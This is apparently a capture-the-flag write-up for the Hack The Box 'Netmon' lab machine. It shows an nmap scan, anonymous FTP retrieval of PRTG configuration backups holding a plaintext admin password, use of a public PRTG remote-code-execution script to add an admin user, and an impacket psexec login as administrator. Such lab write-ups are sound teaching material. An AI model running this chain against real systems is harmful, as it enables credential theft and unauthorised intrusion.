# Netmon

`10.10.10.152`

## Nmap scan

```sh
nmap -A -T5 10.10.10.152
```

results

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 22:42 EDT
Warning: 10.10.10.152 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.152
Host is up (0.20s latency).
Not shown: 924 closed ports, 71 filtered ports
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m29s, deviation: 0s, median: 1m28s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-13T02:44:28
|_  start_date: 2020-04-12T23:04:18

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.31 seconds
```

## Enumeration

### FTP

Going into the FTP server to take a look around:

```sh
ftp 10.10.10.152
# Username: Anonymous
# Password: Anonymous
ls
# find the user.txt file
get user.txt
```

and we have our user flag.

### Netmon

Looking at the netmon version of `PRTG 18.1.37.13946`, we find that it used to store passwords in plain text. Let's use the FTP server to find that plaintext file.

A reddit post was found: https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/

```sh
ftp 10.10.10.152
cd programdata
cd paessler
cd "PRTG Network Monitor"
get "PRTG Configuration.dat"
get "PRTG Configuration.old"
get "PRTG Configuration.old.bak"
```

Locally on the machine:

```sh
cat 'PRTG Configuration.old.bak' | grep -B 5 "prtgadmin"
#             </dbauth>
#             <dbcredentials>
#               0
#             </dbcredentials>
#             <dbpassword>
#               <!-- User: prtgadmin -->
# --                
#                 </homepage>
#                 <lastlogin>
#                   43499.7768071065
#                 </lastlogin>
#                 <login>
#                   prtgadmin
```

The password is `PrTg@dmin2019` instead of `PrTg@dmin2018`.

Now using burpsuite to get the cookie of this login and then use the script by https://github.com/M4LV0/PRTG-Network-Monitor-RCE

```sh
./prtg-exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.781493792.1586746211; _gid=GA1.4.661617980.1586746211; OCTOPUS1813713946=ezYwM0M1MEU4LTdCQzItNEExRC1BRTVFLTFFODM3RDZDRjdFNn0%3D; _gat=1"

# Final result: exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!
```

Now the exploit is done and we can use `psexec` to login from https://github.com/SecureAuthCorp/impacket (remember to `pip install .` for this repo) using `impacket`

```sh
cd impacket-master/examples
./psexec.py pentest@10.10.10.152
# enter password P3nT3st!
```
and now we hvae root.